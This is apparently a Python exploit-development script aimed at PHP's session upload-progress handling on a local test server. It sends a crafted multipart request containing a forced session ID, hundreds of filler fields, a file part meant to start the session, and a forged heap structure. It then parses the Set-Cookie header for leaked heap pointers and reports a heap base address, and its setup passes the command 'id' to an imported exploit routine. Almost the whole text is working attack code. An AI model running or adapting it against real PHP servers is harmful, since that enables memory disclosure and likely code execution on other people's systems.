#!/usr/bin/env python3
"""reqB WITH a file part (to trigger FILE_START -> php_rinit_session -> active session)."""
import sys, time, struct, re
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, Exploit, build_multipart
t = Target("http://127.0.0.1:18111/index.php", timeout=90.0, verbose=False)
ex = Exploit(t, "id", profile="bookworm")
parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
         {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
for i in range(841):
    parts.append({"name": str(1000+i), "data": (f"v{i:04d}"+"x"*44)[:48].encode()})
# FILE part (triggers FILE_START -> php_rinit_session(0) + PS(id) set -> active)
parts.append({"name":"f","filename":"a.txt","data":b"A"*64})
forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18]=ord("L")
parts.append({"name":"1999","data":bytes(forge)})
r = t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)
ck = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?);", r)
clen = len(ck.group(1)) if ck else 0
print("cookie len:", clen)
# check for heap leak
if clen > 100:
    from collections import Counter
    c = Counter()
    raw = ck.group(1)
    for i in range(0, len(raw)-8, 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if c:
        base, cnt = c.most_common(1)[0]
        print(f"HEAP LEAK base=0x{base:x} count={cnt}")
    else:
        print("long cookie but no heap pointers")
print("body:", r.partition(b"\r\n\r\n")[2][:100])
